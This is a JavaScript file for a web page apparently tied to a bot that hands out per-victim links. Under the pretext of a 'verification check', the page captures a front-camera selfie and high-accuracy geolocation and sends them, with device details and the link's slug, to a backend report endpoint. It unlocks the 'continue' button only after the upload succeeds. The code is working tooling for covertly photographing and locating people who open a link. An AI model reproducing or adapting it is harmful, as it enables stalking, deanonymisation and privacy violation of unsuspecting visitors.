// === app.js (OneClick linked with bot) ===

// API base comes from index.html <script>window.__API_BASE=...</script>
const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
  ? String(window.__API_BASE).replace(/\/+$/, '')
  : '';

const UI = {
  text: document.getElementById('text'),
  note: document.getElementById('note'),
  btn: document.getElementById('enterBtn'),
};

window.__reportReady = false;
window.__SLUG = window.__SLUG ?? null; // глобально

// === slug resolver (query -> /r/<slug> -> cached) ===
function determineSlug() {
  const q = new URLSearchParams(location.search).get('slug');
  const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
  const pathSlug = m ? m[1] : null;
  const slug = q || pathSlug || window.__SLUG || null;
  if (slug) window.__SLUG = slug;
  return slug;
}

// === FETCH LINK INFO (просто проверка slug) ===
async function loadLinkInfo() {
  const slug = determineSlug();
  if (!slug) return;
  try {
    const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(slug)}`);
    if (r.ok) console.log('🔗 link-info ok for', slug);
  } catch (e) {
    console.warn('link-info fetch failed', e);
  }
}

// === Кнопка ===
function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = 'grayscale(35%) brightness(0.9)';
  b.style.opacity = '0.6';
  b.style.cursor = 'not-allowed';
  b.style.background = 'linear-gradient(90deg, #246, #39a)';
  b.style.boxShadow = '0 0 6px rgba(0,153,255,.25)';
}

function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = 'none';
  b.style.opacity = '1';
  b.style.cursor = 'pointer';
  b.style.background = 'linear-gradient(90deg, #4f00ff, #00bfff)';
  b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
}

// === Гео ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Сжатие ===
function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement('canvas');
      c.width = w;
      c.height = h;
      c.getContext('2d').drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL('image/jpeg', quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

// === Фото ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia)
    throw new Error('Camera unsupported');

  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
  const [track] = stream.getVideoTracks();
  try {
    if (typeof ImageCapture !== 'undefined') {
      const cap = new ImageCapture(track);
      const bmp = await cap.grabFrame();
      const c = document.createElement('canvas');
      c.width = bmp.width; c.height = bmp.height;
      c.getContext('2d').drawImage(bmp, 0, 0);
      const dataUrl = c.toDataURL('image/jpeg', 0.85);
      track.stop();
      return dataUrl;
    }
    const v = document.createElement('video');
    v.srcObject = stream;
    await v.play();
    const c = document.createElement('canvas');
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach((t) => t.stop());
    return dataUrl;
  } catch (e) {
    try { track && track.stop(); } catch {}
    throw e;
  }
}

// === Инфо ===
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isSafari =
    /Safari\//.test(ua) &&
    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
    navigator.vendor === 'Apple Computer, Inc.';
  const m = ua.match(/OS\s(\d+)[_.]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
}

// === Отправка отчёта ===
async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfo();
  const slug = determineSlug();
  if (!slug) throw new Error('No slug in URL');

  const body = { ...info, geo, photoBase64, note: 'auto', slug };

  const r = await fetch(`${API_BASE}/api/report`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  const text = await r.text();
  let data; try { data = JSON.parse(text); } catch {}
  if (!r.ok || !data?.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
  return data;
}

// === Основной поток ===
async function autoFlow() {
  try {
    setBtnLocked();
    UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost';
    if (!isSecure) throw new Error('Нужен HTTPS (или localhost) для камеры/гео');
    const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhoto()]);
    const photoBase64 = await downscaleDataUrl(rawPhoto, 1280, 0.7);
    UI.text.innerHTML = 'Отправляем данные…';
    await sendReport({ photoBase64, geo });
    window.__reportReady = true;
    setBtnReady();
    UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
    UI.note.textContent = 'Можно продолжить.';
  } catch (e) {
    console.error(e);
    setBtnLocked();
    window.__reportReady = false;
    UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
    UI.note.textContent = String(e.message || e);
  }
}

// === Инициализация ===
window.__autoFlow = autoFlow;
loadLinkInfo(); // ← загрузка slug и sanity-check
